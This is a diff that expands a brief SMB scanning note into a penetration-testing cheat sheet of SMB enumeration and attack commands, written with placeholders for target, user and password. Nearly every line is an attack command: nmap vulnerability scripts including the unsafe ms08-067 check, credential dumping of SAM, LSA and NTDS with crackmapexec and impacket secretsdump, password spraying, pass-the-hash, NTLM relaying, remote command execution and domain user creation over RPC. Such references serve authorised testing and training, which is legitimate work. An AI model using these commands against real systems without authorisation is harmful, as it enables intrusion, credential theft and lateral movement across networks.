@@ -1,24 +1,151 @@
-# scannign for the netBIOS sevice
-# SMB 
-# tcp 139 & 445
+# Port Scanning
 
-> nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254 
-or
-> sudo nbtscan -r 10.11.1.0/24
+nmap -v -p 139,445 <target>/24 -oG smb.txt
+sudo nbtscan -r <target>/24
 
+# SMB NSE Scripts
 
-# nse scripts
+nmap -p 139,445 --script=smb-os-discovery <target>
+nmap -p 139,445 --script=smb-enum-shares <target>
+nmap -p 139,445 --script=smb-enum-users <target>
+nmap -p 139,445 --script=smb-enum-domains <target>
+nmap -p 139,445 --script=smb-enum-groups <target>
+nmap -p 139,445 --script=smb-enum-processes <target>
+nmap -p 139,445 --script=smb-enum-services <target>
+nmap -p 139,445 --script=smb-enum-sessions <target>
+nmap -p 139,445 --script=smb-protocols <target>
+nmap -p 139,445 --script=smb-security-mode <target>
+nmap -p 139,445 --script=smb-server-stats <target>
+nmap -p 139,445 --script=smb-system-info <target>
+nmap -p 139,445 --script=smb-ls --script-args smbusername=<user>,smbpassword=<pass> <target>
+nmap -p 139,445 --script=smb-mbenum <target>
+nmap -p 139,445 --script=smb2-capabilities <target>
+nmap -p 139,445 --script=smb2-security-mode <target>
+nmap -p 139,445 --script=smb2-time <target>
+nmap -p 139,445 --script=smb2-vuln-uptime <target>
 
-> ls -1 /usr/share/nmap/scripts/smb*
+# SMB Vulnerability Scripts
 
-# smb OS discovery module
+nmap -p 139,445 --script=smb-vuln* <target>
+nmap -p 139,445 --script=smb-vuln-conficker <target>
+nmap -p 139,445 --script=smb-vuln-cve2009-3103 <target>
+nmap -p 139,445 --script=smb-vuln-cve-2017-7494 <target>
+nmap -p 139,445 --script=smb-vuln-ms06-025 <target>
+nmap -p 139,445 --script=smb-vuln-ms07-029 <target>
+nmap -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <target>
+nmap -p 139,445 --script=smb-vuln-ms10-054 <target>
+nmap -p 139,445 --script=smb-vuln-ms10-061 <target>
+nmap -p 139,445 --script=smb-vuln-ms17-010 <target>
+nmap -p 139,445 --script=smb-vuln-regsvc-dos <target>
+nmap -p 139,445 --script=smb-double-pulsar-backdoor <target>
 
-> nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
+# enum4linux
 
-# To see known smb protocol vulnerabilities
+enum4linux -a <target>
+enum4linux -U <target>
+enum4linux -S <target>
+enum4linux -P <target>
+enum4linux -G <target>
+enum4linux -o <target>
+enum4linux -u <user> -p <pass> -a <target>
 
-> ls /usr/share/nmap/scripts/smb-vuln-*
+# enum4linux-ng
 
-# To scan a vulnerability of a certain protocol in this case ms08-067
+enum4linux-ng -A <target>
+enum4linux-ng -As <target>
+enum4linux-ng -A <target> -u <user> -p <pass>
 
-> nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.227
+# smbclient
+
+smbclient -L //<target> -N
+smbclient -L //<target> -U <user>
+smbclient //<target>/<share> -N
+smbclient //<target>/<share> -U <user>
+smbclient //<target>/<share> -U <user>%<pass>
+smbclient //<target>/C$ -U <user>%<pass>
+smbclient //<target>/<share> -U <user>%<pass> -c "get <file>"
+smbclient //<target>/<share> -U <user>%<pass> -c "put <local_file> <remote_file>"
+smbclient //<target>/<share> -U <user>%<pass> -c "recurse; prompt; mget *"
+
+# smbmap
+
+smbmap -H <target>
+smbmap -H <target> -u null -p ""
+smbmap -H <target> -u <user> -p <pass>
+smbmap -H <target> -u <user> -p <pass> -d <domain>
+smbmap -H <target> -u <user> -p <pass> -r <share>
+smbmap -H <target> -u <user> -p <pass> -R <share>
+smbmap -H <target> -u <user> -p <pass> --download <share>/<file>
+smbmap -H <target> -u <user> -p <pass> --upload <local_file> <share>/<file>
+smbmap -H <target> -u <user> -p <pass> -x "ipconfig"
+
+# crackmapexec / netexec
+
+crackmapexec smb <target>
+crackmapexec smb <target> -u <user> -p <pass>
+crackmapexec smb <target> -u <user> -p <pass> --shares
+crackmapexec smb <target> -u <user> -p <pass> --sessions
+crackmapexec smb <target> -u <user> -p <pass> --users
+crackmapexec smb <target> -u <user> -p <pass> --groups
+crackmapexec smb <target> -u <user> -p <pass> --loggedon-users
+crackmapexec smb <target> -u <user> -p <pass> --pass-pol
+crackmapexec smb <target> -u <user> -p <pass> --sam
+crackmapexec smb <target> -u <user> -p <pass> --lsa
+crackmapexec smb <target> -u <user> -p <pass> --ntds
+crackmapexec smb <target> -u <user> -p <pass> --ntds --enabled
+crackmapexec smb <target> -u <user> -p <pass> -M spider_plus
+crackmapexec smb <target> -u <user> -p <pass> -M spider_plus --spider C$
+crackmapexec smb <target>/24 -u <user> -p <pass>
+crackmapexec smb <target> -u users.txt -p pass.txt --no-bruteforce
+crackmapexec smb <target> -u users.txt -p pass.txt
+crackmapexec smb <target> -u <user> -H <ntlm_hash>
+crackmapexec smb <target> -u <user> -H <ntlm_hash> --local-auth
+crackmapexec smb <target> -u <user> -p <pass> -x "whoami"
+crackmapexec smb <target> -u <user> -p <pass> -X "Get-Process"
+
+netexec smb <target>
+netexec smb <target> -u <user> -p <pass> --shares
+netexec smb <target> -u <user> -p <pass> --users
+netexec smb <target> -u <user> -H <ntlm_hash>
+
+# impacket
+
+impacket-smbclient <domain>/<user>:<pass>@<target>
+impacket-psexec <domain>/<user>:<pass>@<target>
+impacket-wmiexec <domain>/<user>:<pass>@<target>
+impacket-smbexec <domain>/<user>:<pass>@<target>
+impacket-atexec <domain>/<user>:<pass>@<target> <command>
+impacket-secretsdump <domain>/<user>:<pass>@<target>
+impacket-lookupsid <domain>/<user>:<pass>@<target>
+impacket-reg <domain>/<user>:<pass>@<target> query -keyName HKLM\\SOFTWARE
+impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>
+impacket-secretsdump <domain>/<user>@<target> -hashes :<ntlm_hash>
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# rpcclient
+
+rpcclient -U "" -N <target>
+rpcclient -U <user>%<pass> <target>
+
+  > srvinfo
+  > enumdomusers
+  > enumdomgroups
+  > querydominfo
+  > getdompwinfo
+  > lookupnames <user>
+  > queryuser <rid>
+  > querygroupmem <rid>
+  > enumprivs
+  > netshareenumall
+  > netsharegetinfo <share>
+  > lsaenumsid
+  > lookupsids <sid>
+  > createdomuser <user>
+  > setuserinfo2 <user> 24 <pass>
+
+# Mounting SMB Shares
+
+sudo mount -t cifs //<target>/<share> /mnt/smb
+sudo mount -t cifs -o username=<user>,password=<pass> //<target>/<share> /mnt/smb
+sudo mount -t cifs -o username=guest,password="" //<target>/<share> /mnt/smb
+sudo mount -t cifs -o username=<user>,password=<pass>,domain=<domain> //<target>/<share> /mnt/smb
